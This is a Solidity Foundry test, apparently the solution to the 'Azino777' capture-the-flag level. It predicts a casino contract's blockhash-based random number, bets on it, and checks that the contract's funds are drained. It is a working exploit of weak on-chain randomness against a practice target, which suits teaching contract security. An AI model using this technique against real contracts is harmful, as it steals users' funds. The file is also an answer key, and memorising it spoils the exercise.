// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/01_Azino777/Azino777.sol";

contract Azino777Test is BaseTest {
    Azino777 instance;

    function setUp() public override {
        super.setUp();
        instance = new Azino777{value: 0.01 ether}();
        vm.roll(43133);  // Устанавливаем блок, с которого будем делать ставку
    }

    function testExploitLevel() public {
        // Предсказание числа, которое вернёт rand
        uint256 predictedNumber = predictRandomNumber();

        // Совершаем ставку на предсказанное число
        instance.spin{value: 0.01 ether}(predictedNumber);

        // Проверяем, что баланс контракта стал 0 (мы выиграли)
        checkSuccess();
    }

    // Функция для предсказания случайного числа
    function predictRandomNumber() public view returns (uint256) {
        uint256 factor = (1157920892373161954235709850086879078532699846656405640394575840079131296399 * 100) / 100;
        uint256 lastBlockNumber = block.number - 1;
        uint256 hashVal = uint256(blockhash(lastBlockNumber));

        return (hashVal / factor) % 100;
    }
    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
